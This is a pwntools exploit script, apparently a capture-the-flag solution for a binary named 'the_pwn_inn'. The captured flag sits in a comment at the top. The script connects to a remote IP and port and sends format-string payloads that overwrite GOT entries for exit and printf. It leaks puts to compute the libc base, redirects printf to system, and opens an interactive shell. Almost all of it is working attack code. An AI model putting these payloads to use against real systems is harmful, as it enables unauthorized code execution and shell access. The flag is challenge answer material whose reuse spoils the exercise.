#flag = flag{GOTt4_b3_OVERWRITEing_th0s3_symb0ls_742837423}
from pwn import *

elf = ELF('./the_pwn_inn')
libc = ELF('./libc6_2.31-0ubuntu7_amd64.so')
ld = ELF("./ld-2.31.so")
target = process([ld.path, elf.path], env={"LD_PRELOAD": libc.path})
target = remote('161.97.176.150', 2626)

target.recvuntil("your name? ")
payload  = ""
payload += "%"+str(0x13)+"c" + "%11$hhn" + "%"+str(0x28-0x13)+"c" + "%12$hhnTT"
payload += "%10$s".ljust(8, " ") + p64(elf.got['puts']) + p64(elf.got['exit'] + 1) + p64(elf.got['exit'])

target.sendline(payload)

target.recvuntil("TT")
libc_base = u64(target.recv(6).ljust(8, "\x00")) - libc.sym['puts']
log.info("LIBC base: " + hex(libc_base))

gadget = libc_base + libc.sym['system']
b1 = gadget & 0xff
b2 = (gadget >> 8) & 0xff
b3 = (gadget >> 16) & 0xff
attack  = ""
attack += "%"+str(b1)+"c" + "%12$hhn" + "%"+str(0x100 + b2 - b1)+"c" + "%13$hhn" + "%"+str(0x100 + b3 - b2)+"c" + "%14$hhn"
attack += "A"*(0x30 - len(attack))
attack += p64(elf.got['printf']) + p64(elf.got['printf'] + 1) + p64(elf.got['printf'] + 2)
target.sendline(attack)

target.sendline("sh\x00")

target.interactive()
